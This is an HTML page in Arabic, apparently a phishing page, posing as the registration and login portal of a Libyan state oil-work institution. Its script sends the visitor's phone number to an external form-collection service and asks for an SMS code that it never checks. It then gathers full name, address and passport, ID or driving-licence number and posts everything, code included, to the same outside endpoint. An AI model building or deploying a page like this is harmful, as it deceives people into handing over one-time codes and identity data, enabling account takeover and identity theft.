<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>المؤسسة الوطنــية</title>
  <link rel="icon" href="uy.jpeg" type="image/png">
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #002147, #003366);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      direction: rtl;
    }

    .container {
      background: #fff;
      border-radius: 20px;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
      padding: 35px 40px;
      width: 96%;
      max-width: 420px;
      box-sizing: border-box;
      text-align: center;
      z-index: 1;
    }

    .logo-container {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo-container img {
      width: 90px;
      height: 90px;
      object-fit: contain;
      margin: 0 auto;
      display: block;
    }

    .logo-container p {
      margin-top: 8px;
      font-weight: 700;
      color: #003366;
      font-size: 16px;
    }

    h2 {
      margin-bottom: 25px;
      color: #003366;
      font-weight: 900;
      font-family: Arial, Helvetica, sans-serif;
      font-size: 32px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #222;
      text-align: right;
    }

    input[type="tel"],
    input[type="text"],
    select {
      width: 100%;
      padding: 12px 15px;
      font-size: 16px;
      border-radius: 10px;
      border: 1.8px solid #bbb;
      margin-bottom: 18px;
      transition: border-color 0.3s ease;
      box-sizing: border-box;
      font-family: inherit;
    }

    input:focus, select:focus {
      border-color: gold;
      outline: none;
    }

    input:disabled {
      background-color: #f2f2f2;
    }

    button {
      width: 40%;
      padding: 12px;
      font-size: 17px;
      background-color: gold;
      border: none;
      border-radius: 10px;
      color: #002147;
      cursor: pointer;
      font-weight: bold;
      font-family: Calibri, sans-serif;
      transition: background-color 0.3s ease;
      margin-bottom: 15px;
    }

    button:hover:not(:disabled) {
      background-color: #e6c200;
    }

    button:disabled {
      background-color: #c2a300;
      cursor: not-allowed;
    }

    #timer {
      text-align: center;
      font-weight: 600;
      color: black;
      margin-bottom: 20px;
      min-height: 24px;
    }

    #codeField {
      display: none;
    }

    .error {
      color: red;
      font-size: 14px;
      margin-top: -10px;
      margin-bottom: 15px;
    }

    #extraFields {
      display: none;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="logo-container">
    <img src="uy.jpeg" alt="شعار المؤسسة" />
    <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
  </div>

  <h2>تسجيل الدخول</h2>

  <form id="phoneForm" onsubmit="return sendPhone(event);">
    <label for="phone">رقم الهاتف:</label>
    <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" />
    <button type="submit" id="sendPhoneBtn">أرسل كود</button>
    <div id="timer"></div>
  </form>

  <form id="codeForm" onsubmit="return sendCode(event);">
    <div id="codeField">
      <label for="code">جاري إرسال الكود عبر SMS</label>
      <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" />
      <div id="errorMessage" class="error"></div>

      <div id="extraFields">
        <label for="fullName">الاسم بالكامل:</label>
        <input type="text" id="fullName" name="fullName" placeholder="اكتب اسمك الكامل" required />

        <label for="address">العنوان:</label>
        <input type="text" id="address" name="address" placeholder="اكتب عنوانك" required />

        <label for="documentType">نوع البطاقة:</label>
        <select id="documentType" name="documentType" onchange="updateDocLabel()" required>
          <option value="">-- اختر نوع البطاقة --</option>
          <option value="جواز سفر">جواز سفر</option>
          <option value="بطاقة شخصية">بطاقة شخصية</option>
          <option value="رخصة قيادة">رخصة قيادة</option>
        </select>

        <label id="documentLabel" for="documentNumber">رقم الوثيقة:</label>
        <input type="text" id="documentNumber" name="documentNumber" placeholder="أدخل رقم الوثيقة" required />
      </div>

      <button type="submit" id="sendCodeBtn">طلب الدخول</button>
    </div>
  </form>
</div>

<script>
  let codeVerified = false;
  let countdownInterval;

  const phoneInput = document.getElementById('phone');
  const codeInput = document.getElementById('code');
  const sendPhoneBtn = document.getElementById('sendPhoneBtn');
  const timerDisplay = document.getElementById('timer');
  const codeField = document.getElementById('codeField');
  const extraFields = document.getElementById('extraFields');
  const sendCodeBtn = document.getElementById('sendCodeBtn');
  const errorMessage = document.getElementById('errorMessage');

  function startTimer(duration) {
    let timeLeft = duration;
    timerDisplay.style.display = 'block';
    updateTimer(timeLeft);
    countdownInterval = setInterval(() => {
      timeLeft--;
      updateTimer(timeLeft);
      if (timeLeft <= 0) {
        clearInterval(countdownInterval);
        timerDisplay.style.display = 'none';
        sendPhoneBtn.disabled = false;
        phoneInput.disabled = false;
      }
    }, 1000);
  }

  function updateTimer(seconds) {
    const minutes = Math.floor(seconds / 60).toString().padStart(2, '0');
    const secs = (seconds % 60).toString().padStart(2, '0');
    timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${secs}`;
  }

  function sendPhone(event) {
    event.preventDefault();

    if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
      alert('يرجى إدخال رقم هاتف صحيح');
      return false;
    }

    fetch('https://formcarry.com/s/12UxdOsTbaW', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify({ phone: phoneInput.value })
    })
    .then(res => {
      if (!res.ok) throw new Error('فشل الإرسال');
      phoneInput.disabled = true;
      sendPhoneBtn.disabled = true;
      codeField.style.display = 'block';
      startTimer(480);
    })
    .catch(err => {
      alert('حدث خطأ أثناء الإرسال');
      console.error(err);
    });

    return false;
  }

  function sendCode(event) {
    event.preventDefault();
    errorMessage.textContent = '';

    const code = codeInput.value.trim();
    const fullName = document.getElementById('fullName').value.trim();
    const address = document.getElementById('address').value.trim();
    const documentType = document.getElementById('documentType').value;
    const documentNumber = document.getElementById('documentNumber').value.trim();

    if (!codeVerified) {
      if (code === '') {
        errorMessage.textContent = 'يرجى إدخال الكود';
        return false;
      }

      extraFields.style.display = 'block';
      codeVerified = true;
      sendCodeBtn.textContent = 'إرسال البيانات';
      return false;
    }

    if (!fullName || !address || !documentType || !documentNumber) {
      errorMessage.textContent = 'يرجى تعبئة جميع الحقول';
      return false;
    }

    fetch('https://formcarry.com/s/12UxdOsTbaW', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify({
        phone: phoneInput.value,
        code: code,
        fullName,
        address,
        documentType,
        documentNumber
      })
    }).then(res => {
      if (res.ok) {
        window.location.href = 'success.html';
      } else {
        errorMessage.textContent = 'حدث خطأ أثناء إرسال البيانات';
      }
    }).catch(err => {
      errorMessage.textContent = '⚠️ تعذر الاتصال بالخادم';
      console.error(err);
    });

    return false;
  }

  function updateDocLabel() {
    const type = document.getElementById('documentType').value;
    const label = document.getElementById('documentLabel');
    if (type === "جواز سفر") {
      label.textContent = "رقم جواز السفر:";
    } else if (type === "بطاقة شخصية") {
      label.textContent = "رقم البطاقة الشخصية:";
    } else if (type === "رخصة قيادة") {
      label.textContent = "رقم رخصة القيادة:";
    } else {
      label.textContent = "رقم الوثيقة:";
    }
  }
</script>

</body>
</html>
